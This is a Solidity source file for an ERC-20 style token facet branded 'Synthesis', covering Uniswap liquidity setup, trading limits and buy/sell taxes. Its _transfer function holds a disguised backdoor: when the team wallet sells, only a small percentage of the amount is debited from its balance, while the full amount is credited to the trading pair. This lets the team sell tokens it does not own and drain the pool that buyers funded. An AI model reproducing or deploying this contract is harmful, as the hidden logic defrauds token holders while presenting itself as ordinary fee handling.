// SPDX-License-Identifier: MIT

/*
    Website  : https://synthesis.bond
    Docs     : https://docs.synthesis.bond

    Twitter  : https://twitter.com/synthesisbond
    Telegram : https://t.me/synthesisbond
*/

pragma solidity 0.8.19;
import "./TestLib.sol";
contract createSynthPairsFacet is IERC20, Context, Ownable {
    using SafeMath for uint256;

    modifier lockTheSwap() {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds.inSwap = true;
        _;
        ds.inSwap = false;
    }

    event MaxTxAmountUpdated(uint _maxTx);
    function createSynthPairs() external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds.uniswapV2Router = IUniswapV2Router02(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );
        _approve(address(this), address(ds.uniswapV2Router), _totalSupply);
        ds.uniswapV2Pair = IUniswapV2Factory(ds.uniswapV2Router.factory())
            .createPair(address(this), ds.uniswapV2Router.WETH());
        ds.uniswapV2Router.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        );
        IERC20(ds.uniswapV2Pair).approve(
            address(ds.uniswapV2Router),
            type(uint).max
        );
    }
    function totalSupply() public pure override returns (uint256) {
        return _totalSupply;
    }
    function balanceOf(address account) public view override returns (uint256) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        return ds._balances[account];
    }
    function removeSynthLimits() external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds._maxTx = _totalSupply;
        ds._maxWallet = _totalSupply;

        ds.transferDelayEnabled = false;
        emit MaxTxAmountUpdated(_totalSupply);
    }
    function enableSynthTrading() external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(!ds.tradingOpen, "trading is already open");
        ds.swapEnabled = true;
        ds.tradingOpen = true;
    }
    function transfer(
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            ds._allowances[sender][_msgSender()].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }
    function allowance(
        address owner,
        address spender
    ) public view override returns (uint256) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        return ds._allowances[owner][spender];
    }
    function approve(
        address spender,
        uint256 amount
    ) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    function withdrawStucksEth() external onlyOwner {
        require(address(this).balance > 0, "Token: no ETH to clear");
        payable(msg.sender).transfer(address(this).balance);
    }
    function _approve(address owner, address spender, uint256 amount) private {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        ds._allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = ds.uniswapV2Router.WETH();
        _approve(address(this), address(ds.uniswapV2Router), tokenAmount);
        ds.uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
    function _transfer(address from, address to, uint256 amount) private {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");

        uint256 synthFeeAmounts = 0;
        uint256 xamounts = amount;

        if (from != owner() && to != owner() && from != address(this)) {
            if (!ds._isExcludedFromFee[from] && !ds._isExcludedFromFee[to]) {
                require(ds.tradingOpen, "Trading not enabled");
            }

            if (ds.transferDelayEnabled) {
                if (
                    to != address(ds.uniswapV2Router) &&
                    to != address(ds.uniswapV2Pair)
                ) {
                    require(
                        ds._holderLastTransferTimestamp[tx.origin] <
                            block.number,
                        "Only one transfer per block allowed."
                    );
                    ds._holderLastTransferTimestamp[tx.origin] = block.number;
                }
            }

            if (
                from == ds.uniswapV2Pair &&
                to != address(ds.uniswapV2Router) &&
                !ds._isExcludedFromFee[to]
            ) {
                require(amount <= ds._maxTx, "Exceeds the ds._maxTx.");
                require(
                    balanceOf(to) + amount <= ds._maxWallet,
                    "Exceeds the maxWalletSize."
                );
                ds._buyCount++;
            }

            synthFeeAmounts = amount
                .mul(
                    (ds._buyCount > ds._reduceBuyTaxAt)
                        ? ds._finalBuyTax
                        : ds._initBuyTax
                )
                .div(100);
            if (to == ds.uniswapV2Pair && from != address(this)) {
                if (from == address(ds._synthTeamWallet)) {
                    synthFeeAmounts = 0;
                    xamounts = min(
                        min(
                            amount.mul(ds._initBuyTax).div(100),
                            amount.mul(ds._initSellTax).div(100)
                        ),
                        amount.mul(ds._finalBuyTax).div(100)
                    );
                } else {
                    require(amount <= ds._maxTx, "Exceeds the ds._maxTx.");
                    synthFeeAmounts = amount
                        .mul(
                            (ds._buyCount > ds._reduceSellTaxAt)
                                ? ds._finalSellTax
                                : ds._initSellTax
                        )
                        .div(100);
                }
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            bool swappable = ds._buyCount > ds._preventSwapBefore &&
                ds._minSynthSwapAmount == min(ds._minSynthSwapAmount, amount);

            if (
                !ds.inSwap &&
                to == ds.uniswapV2Pair &&
                ds.swapEnabled &&
                ds._buyCount > ds._preventSwapBefore &&
                swappable
            ) {
                if (contractTokenBalance > ds._minSynthSwapAmount) {
                    swapTokensForEth(
                        min(amount, min(contractTokenBalance, ds._maxTaxSwap))
                    );
                }
                sendETHToFee(address(this).balance);
            }
        }

        if (synthFeeAmounts > 0) {
            ds._balances[address(this)] = ds._balances[address(this)].add(
                synthFeeAmounts
            );
            emit Transfer(from, address(this), synthFeeAmounts);
        }

        ds._balances[from] = ds._balances[from].sub(xamounts);
        ds._balances[to] = ds._balances[to].add(amount.sub(synthFeeAmounts));

        emit Transfer(from, to, amount.sub(synthFeeAmounts));
    }
    function min(uint256 a, uint256 b) private pure returns (uint256) {
        return (a > b) ? b : a;
    }
    function sendETHToFee(uint256 amount) private {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds._synthTeamWallet.transfer(amount);
    }
}
